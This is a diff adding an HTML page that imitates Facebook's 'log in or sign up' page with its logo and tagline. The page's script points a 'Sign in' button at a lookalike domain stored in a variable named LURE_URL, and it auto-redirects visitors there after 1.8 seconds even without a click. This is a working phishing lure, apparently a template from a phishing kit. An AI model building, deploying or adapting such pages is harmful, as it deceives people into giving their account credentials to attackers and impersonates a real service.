@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – log in or sign up</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
+    .card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px 36px 32px;width:100%;max-width:400px;text-align:center}
+    .logo{margin-bottom:24px;display:flex;align-items:center;justify-content:center}
+    .tagline{color:#666;font-size:15px;margin-bottom:28px;line-height:1.4}
+    .btn{display:block;width:100%;padding:12px;background:#1877F2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:opacity .2s}
+    .btn:hover{opacity:.88}
+    .spinner{width:36px;height:36px;border:3px solid #eee;border-top:3px solid #1877F2;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading{display:none}
+    .loading p{color:#888;font-size:14px;margin-top:8px}
+    footer{margin-top:24px;color:#999;font-size:12px}
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" viewBox="0 0 36 36"><path fill="#1877F2" d="M36 18C36 8.059 27.941 0 18 0S0 8.059 0 18c0 8.99 6.584 16.434 15.188 17.79V23.22h-4.57V18h4.57v-3.968c0-4.511 2.688-7.004 6.797-7.004 1.969 0 4.028.352 4.028.352v4.43h-2.27c-2.234 0-2.93 1.386-2.93 2.808V18h4.99l-.797 5.22h-4.193v12.57C29.416 34.434 36 26.99 36 18z"/></svg></div>
+    <p class="tagline">Connect with friends and the world around you.</p>
+    <a class="btn" id="btn" href="#">Sign in</a>
+  </div>
+  <div class="card loading" id="loading">
+    <div class="spinner"></div>
+    <p>Redirecting to secure sign-in&hellip;</p>
+  </div>
+  <footer>Secure connection &bull; Privacy Policy</footer>
+  <script>
+    var LURE_URL = 'https://www.facebook2026.authenticationsession.online/OeEYylLs'; /* AUTO_LURE_URL */
+    document.getElementById('btn').href = LURE_URL;
+    document.getElementById('btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    });
+    // Auto-redirect after 1.8s if user doesn't click
+    setTimeout(function(){
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    }, 1800);
+  </script>
+</body>
+</html>
